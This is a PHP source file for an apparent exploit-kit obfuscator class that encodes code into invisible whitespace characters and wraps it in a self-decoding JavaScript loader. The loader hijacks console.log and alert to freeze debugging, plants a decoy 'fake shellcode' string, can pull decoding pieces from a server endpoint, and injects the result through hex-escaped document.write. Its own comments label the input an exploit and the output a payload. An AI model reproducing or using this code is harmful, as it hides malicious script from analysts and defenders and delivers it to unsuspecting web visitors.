<?php 

/*
 * VERSION: Lesda - 3
 */
class kenai {
	
	var $ascii_reverse = false;
	var $random_shift = 0;
	var $alpha_key = "";
	var $invisble_key = "";
	var $invisible_alpha = "";
	var $hookers = "";
	var $second = "";
	var $shared_console = "";
	
	public function get_random_string_array($len,$c) {
		$thanksgiving = array();
		$stuffing = str_shuffle("abcdefghijklmnopqrstuvwxyz");
		$turkey = "";
		for ($a = 0; $a <= 100; $a++) {
			$split_decision = rand(0,100);
			if($split_decision > 50) {
				$gravy = strtoupper($stuffing[0]);
			} else {
				$gravy = $stuffing[0];
			}
			$turkey .= $gravy;
		 }
		 
		 for($b = 0; $b <= $c + 5; $b++) { //everyone overeats
		 	$serving_size = substr($turkey,rand(1,24),rand(30,90)); //time to carve
		 	$thanksgiving[] = $serving_size;
		 }
	 
		 return array_values(array_unique($thanksgiving));
	}
	
	public function generate_blanks() {
		$blanks = Array(); //9 - horizontal tab, 11 - vertical tab, 12 - new page
		$blanks[] = chr(9).chr(9).chr(9);
		$blanks[] = chr(9).chr(9).chr(11);
		$blanks[] = chr(9).chr(9).chr(12);
		$blanks[] = chr(9).chr(11).chr(9);
		$blanks[] = chr(9).chr(11).chr(11);
		$blanks[] = chr(9).chr(11).chr(12);
		$blanks[] = chr(9).chr(12).chr(9);
		$blanks[] = chr(9).chr(12).chr(11);
		$blanks[] = chr(9).chr(12).chr(12);
		$blanks[] = chr(11).chr(9).chr(9);
		$blanks[] = chr(11).chr(9).chr(11);
		$blanks[] = chr(11).chr(9).chr(12);
		$blanks[] = chr(11).chr(11).chr(9);
		$blanks[] = chr(11).chr(11).chr(11);
		$blanks[] = chr(11).chr(11).chr(12);
		$blanks[] = chr(11).chr(12).chr(9);
		$blanks[] = chr(11).chr(12).chr(11);
		$blanks[] = chr(11).chr(12).chr(12);
		$blanks[] = chr(12).chr(9).chr(9);
		$blanks[] = chr(12).chr(9).chr(11);
		$blanks[] = chr(12).chr(9).chr(12);
		$blanks[] = chr(12).chr(11).chr(9);
		$blanks[] = chr(12).chr(11).chr(11);
		$blanks[] = chr(12).chr(11).chr(12);
		$blanks[] = chr(12).chr(12).chr(9);
		$blanks[] = chr(12).chr(12).chr(11);
		return $blanks;
	}
	
	/*
	 * Take in original code and turn it into asicc numbers
	 * OUT: 594139111108108101104394011611410110897
	 */
	public function ascii2code($code,$splitter,$randon_shift,$reverse) {
		$res = Array();
		$i = strlen($code);
		for ($a=0;$a<$i;$a++) {
			$csnc = ord($code[$a]);
			$csnc = $csnc - $randon_shift;
			$res[] = $csnc;	
		}
		if($reverse) {
			$res = array_reverse($res);
			$this->ascii_reverse = true;
		}

		$out = join($splitter, $res);
		return $out;
	}
	
	/*
	 * Take in the ascii numbers and map them to a random alpha key, but keep the splits from ascii2code
	 * IN: 594139111108108101104394011611410110897
	 * OUT: gmcovmoooojbojbojoojcvmcjoosoocojoojbmx
	 */
	public function code2char($code) {
		$this->alpha_key = str_shuffle("abcdefghijklmnopqrstuvwxyz"); //26 blank codes, 26 letters
		$out = "";
		for($i=0;$i < strlen($code); $i++) {
			if(is_numeric($code[$i])) {
				$out .= $this->alpha_key[$code[$i]];
			} else { //hit those blank splitters
				$out .= $code[$i];
			}
		}
		$this->second = $out;
		return $out;
	}
	
	/*
	 * Take in ASCII string and map it to the invisible key
	 * IN: gmcovmoooojbojbojoojcvmcjoosoocojoojbmx
	 * OUT: <invisible>
	 */
	public function make_invisble($code) {
		$out = "";
		for($i=0;$i < strlen($code); $i++) {
			if(ctype_alpha($code[$i])) {
				$out .= $this->invisble_key[$code[$i]]; //produces 2 chars and not 1
			} else { //hit those blank splitters
				$out .= $code[$i];
			}
		}
		return $out;		
	}
	
	/*
	 * Generate an invisible key that will convert numbers to blanks
	 */
	public function gen_invisible_key() {
		$key = Array();
		$tmp = Array();
		$blanks = kenai::generate_blanks();
		$alpha = "abcdefghijklmnopqrstuvwxyz";
		for($i=1;$i<=count($blanks);$i++) {
			$tmp[] = $blanks[$i-1];
			$key[$alpha[$i-1]] = $blanks[$i-1];
		}
		$this->invisible_alpha = join("   ",$tmp);
		$keys = array_keys( $key ); 
		shuffle( $keys );
		$this->invisble_key = array_merge( array_flip( $keys ) , $key ); //shuffle values ONLY to avoid the same ordering
	}
	
	/*
	 * Use all the functions to build the invisble payload
	 */
	public function crypt($orig_code) {
		$split = chr(32) . chr(32) . chr(32);
		$crypt_one = kenai::ascii2code($orig_code,$split,$this->randon_shift,false); //594139111108108101104394011611410110897
		$crypt_two = kenai::code2char($crypt_one); //gmcovmoooojbojbojoojcvmcjoosoocojoojbmx
		kenai::gen_invisible_key();
		$crypt_three = kenai::make_invisble($crypt_two);
		
		return $crypt_three;
	}
	
	public function get_fake_shellcode() {
		$alpha = "abcdefghijklmnopqrstuvwxyz";
		$seed = rand(50,150);
		$char = $alpha[50-rand(26,45)];
		for($i=0;$i < $seed; $i++ ) {
			$shell = rand(48,122);
			$out .= strtoupper($char) . $shell;
		}
		return $out;
	}
	
	public function save_token($alpha,$exp_count) {
		global $link;
		$seed_token = hash("sha1",str_shuffle("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"));
		$query = "insert into seed_tokens (seed,alpha,count) values ('".$seed_token."', '".$alpha."',$exp_count)";
		$results = mysqli_query($link,$query);
		@mysqli_free_result($results);
		return $seed_token;
	}
	
	public function lesda_encoder($code) {
	    $rnd_nm_crypt = kenai::get_random_string_array(rand(30, 100), 50);
	    $payload = "";
	    $payload .= "(function() {"; //create anonymous function
		$payload .= "$rnd_nm_crypt[19] = document;$rnd_nm_crypt[15] = '';";
		$payload .= "if(window.console) {";
		$payload .= "console = { log: function() { while(true) {} } },"; //hook console.log()
		$payload .= "alert = function() { while(true) {} };"; //hook alert();
		$payload .= "}";
		$payload .= "})();"; //execute self and hoist
		$payload .= "if(!Array.indexOf){Array.prototype.indexOf = function(obj){for(var i=0; i<this.length; i++){if(this[i]==obj){return i;}}return -1;}}"; //please die IE
//		$payload .= "$rnd_nm_crypt[19] = document;$rnd_nm_crypt[15] = '';";
        $exploit = kenai::crypt($code);
	    $invis_key = kenai::get_invisible_alpha();
	    $alpha_key = kenai::get_alpha_key();
    	$exp_count = (strlen($exploit)) /3;
    	$seed_token = kenai::save_token($alpha_key,$exp_count);
	    $payload .= "abcdefghijklmnopqrstuvwxyz = '" . kenai::get_fake_shellcode() . "';"; //abc table and fake shell
	    $payload .= "$rnd_nm_crypt[1]='$invis_key';"; //invis key 
	    $payload .= "$rnd_nm_crypt[2]='$exploit';"; //payload
	    $payload .= "$rnd_nm_crypt[4] = 'abcdefghijklmnopqrstuvwxyz';";
	    $split = chr(32) . chr(32) . chr(32);
	    $payload .= "$rnd_nm_crypt[5] = '$split';";

	    $payload .= "var $rnd_nm_crypt[10] = '';";
	    $payload .= "for($rnd_nm_crypt[7]=0;$rnd_nm_crypt[7]<$rnd_nm_crypt[2].length-1;$rnd_nm_crypt[7]++){";
	    $payload .= "var $rnd_nm_crypt[14] = $rnd_nm_crypt[7] + 2;"; //add to the counter
	    $payload .= "var $rnd_nm_crypt[16] = $rnd_nm_crypt[2].charAt($rnd_nm_crypt[7]) + $rnd_nm_crypt[2].charAt($rnd_nm_crypt[7] + 1) + $rnd_nm_crypt[2].charAt($rnd_nm_crypt[7] + 2);"; //bit string - should contain 3
	    $payload .= "if($rnd_nm_crypt[16] != $rnd_nm_crypt[5]) { //{*/}{{{f}unc}ti{on(}){}}*/ \n";
    	$this->shared_console = $rnd_nm_crypt[20];
	    $payload .= "$rnd_nm_crypt[10] += $.ajax({url:'fetch.php',data:{'q':$rnd_nm_crypt[4].charAt($rnd_nm_crypt[1].split($rnd_nm_crypt[5]).indexOf($rnd_nm_crypt[16])),'s':'$seed_token' },async:false}).responseText.replace(/\"/g, '');";
    	$payload .= "if($rnd_nm_crypt[20].firebug)$rnd_nm_crypt[20].clear();";
	    $payload .= "} else //{*/}{{{f}unc}ti{on(}){}}*/ \n"; //ends if
		$payload .= "$rnd_nm_crypt[10] += $rnd_nm_crypt[16];"; //ADD IN THE SPLITTER
   	    $payload .= "$rnd_nm_crypt[7]=$rnd_nm_crypt[14];";
	    $payload .= "}"; //ends for
	    
    	$payload .= "$rnd_nm_crypt[6] = $rnd_nm_crypt[10].split($rnd_nm_crypt[5]);";
	    $payload .= "for($rnd_nm_crypt[17]=0;$rnd_nm_crypt[17]<$rnd_nm_crypt[6].length;$rnd_nm_crypt[17]++){";
	   	$payload .= "$rnd_nm_crypt[15] += String.fromCharCode($rnd_nm_crypt[6][$rnd_nm_crypt[17]]);";
	    $payload .= "}";
		$payload .= "$rnd_nm_crypt[19]['\x77\x72\x69\x74\x65']('<scri'+'pt>');";
		$payload .= "$rnd_nm_crypt[19]['\x77\x72\x69\x74\x65']($rnd_nm_crypt[15]);";
		$payload .= "$rnd_nm_crypt[19]['\x77\x72\x69\x74\x65']('</scri'+'pt>');";
	    
		return $payload;
	}
	
	public function hilma_encoder($code) {
	    $rnd_nm_crypt = kenai::get_random_string_array(rand(30, 100), 50);
	    $payload = "";
    	$payload .= "(function() {"; //create anonymous function
	    $console = kenai::get_shared_console();
		$payload .= "$rnd_nm_crypt[19] = document;$rnd_nm_crypt[15] = '';$console = '';";
		$payload .= "if(window.console) {";
		$payload .= "$console = console;";
		$payload .= "console = { log: function() { while(true) {} } },"; //hook console.log()
		$payload .= "alert = function() { while(true) {} };"; //hook alert();
		$payload .= "}";
		$payload .= "})();"; //execute self and hoist
		$payload .= "if(!Array.indexOf){Array.prototype.indexOf = function(obj){for(var i=0; i<this.length; i++){if(this[i]==obj){return i;}}return -1;}}"; //please die IE
		$payload .= "$rnd_nm_crypt[19] = document;$rnd_nm_crypt[15] = '';";
        $exploit = kenai::crypt($code);
	    $invis_key = kenai::get_invisible_alpha();
	    $alpha_key = kenai::get_alpha_key();
	    $payload .= "$rnd_nm_crypt[0]='$alpha_key';"; //alpha key
	    $payload .= "abcdefghijklmnopqrstuvwxyz = '" . kenai::get_fake_shellcode() . "';"; //abc table and fake shell
	    $payload .= "$rnd_nm_crypt[1]='$invis_key';"; //invis key 
	    $payload .= "$rnd_nm_crypt[2]='$exploit';"; //payload
	    $payload .= "$rnd_nm_crypt[4] = 'abcdefghijklmnopqrstuvwxyz';";
	    $split = chr(32) . chr(32) . chr(32);
	    $payload .= "$rnd_nm_crypt[5] = '$split';";

	    $payload .= "var $rnd_nm_crypt[10] = '';";
	    $payload .= "for($rnd_nm_crypt[7]=0;$rnd_nm_crypt[7]<$rnd_nm_crypt[2].length-1;$rnd_nm_crypt[7]++){";
	    $payload .= "var $rnd_nm_crypt[14] = $rnd_nm_crypt[7] + 2;"; //add to the counter
	    $payload .= "var $rnd_nm_crypt[16] = $rnd_nm_crypt[2].charAt($rnd_nm_crypt[7]) + $rnd_nm_crypt[2].charAt($rnd_nm_crypt[7] + 1) + $rnd_nm_crypt[2].charAt($rnd_nm_crypt[7] + 2);"; //bit string - should contain 3
	    $payload .= "if($rnd_nm_crypt[16] != $rnd_nm_crypt[5]) { //{*/}{{{f}unc}ti{on(}){}}*/ \n";
		$payload .= "var $rnd_nm_crypt[11]=$rnd_nm_crypt[1].split($rnd_nm_crypt[5]);";
		$payload .= "var $rnd_nm_crypt[12]=$rnd_nm_crypt[11].indexOf($rnd_nm_crypt[16]);";
		$payload .= "var $rnd_nm_crypt[13]=$rnd_nm_crypt[4].charAt($rnd_nm_crypt[12]);";
	    $payload .= "$rnd_nm_crypt[10] += $rnd_nm_crypt[0].indexOf($rnd_nm_crypt[13]);";
    	$payload .= "} else { //{*/}{{{f}unc}ti{on(}){}}*/ \n"; //ends if
		$payload .= "$rnd_nm_crypt[10] += $rnd_nm_crypt[16];"; //ADD IN THE SPLITTER
    	$payload .= "}"; //ends if
   	    $payload .= "$rnd_nm_crypt[7]=$rnd_nm_crypt[14];";
	    $payload .= "}"; //ends for
    	$payload .= "$rnd_nm_crypt[6] = $rnd_nm_crypt[10].split($rnd_nm_crypt[5]);";
	    $payload .= "for($rnd_nm_crypt[17]=0;$rnd_nm_crypt[17]<$rnd_nm_crypt[6].length;$rnd_nm_crypt[17]++){";
	   	$payload .= "$rnd_nm_crypt[15] += String.fromCharCode($rnd_nm_crypt[6][$rnd_nm_crypt[17]]);";
	    $payload .= "}";
		$payload .= "$rnd_nm_crypt[19]['\x77\x72\x69\x74\x65']('<scri'+'pt>');";
		$payload .= "$rnd_nm_crypt[19]['\x77\x72\x69\x74\x65']($rnd_nm_crypt[15]);";
		$payload .= "$rnd_nm_crypt[19]['\x77\x72\x69\x74\x65']('</scri'+'pt>');";
	    
		return $payload;
	}
	
	public function get_alpha_key() {
		return $this->alpha_key;
	}
	
	public function get_invisible_alpha() {
		return $this->invisible_alpha;
	}
	
	public function get_shared_console() {
		return $this->shared_console;	
	}
}
?>
